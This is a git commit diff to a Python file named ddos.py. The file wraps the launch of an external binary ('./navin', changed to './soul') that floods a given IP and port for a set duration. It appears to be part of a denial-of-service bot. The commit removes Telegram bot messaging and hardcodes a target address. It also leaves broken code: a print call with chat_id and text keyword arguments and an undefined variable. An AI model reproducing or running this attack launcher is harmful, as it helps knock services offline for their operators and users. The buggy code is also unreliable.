40cf4097698d8756e87e1224e0276ee5eb1cbe34
venom12911 <89091195+venom12911@users.noreply.github.com>
2025-02-27 18:36:58 +0530

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,13 +1,12 @@
-
 import asyncio
 import logging
 
-async def run_attack(chat_id, ip, port, duration, context):
+async def run_attack(ip, port, duration):
     """ Executes the navin binary asynchronously with logging """
     try:
         logging.info(f"Starting attack on {ip}:{port} for {duration}s")
         process = await asyncio.create_subprocess_shell(
-            f"./navin {ip} {port} {duration}",
+            f"./soul {ip} {port} {duration} 10",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
@@ -16,9 +15,9 @@ async def run_attack(chat_id, ip, port, duration, context):
         if stdout:
             print(f"✅ *Output:*\n```\n{stdout.decode()}\n```")
         if stderr:
-            await context.bot.send_message(chat_id=chat_id, text=f"⚠️ *Error:*\n```\n{stderr.decode()}\n```", parse_mode="Markdown")
+            print(chat_id=chat_id, text=f"⚠️ *Error:*\n```\n{stderr.decode()}\n```")
 
     except Exception as e:
         print(f"❌ *Error:* {str(e)}")
 
-asyncio.run(run_attack(ip, port, duration))
+asyncio.run(run_attack(ip="1.1.1.1", port="1111", duration=10))
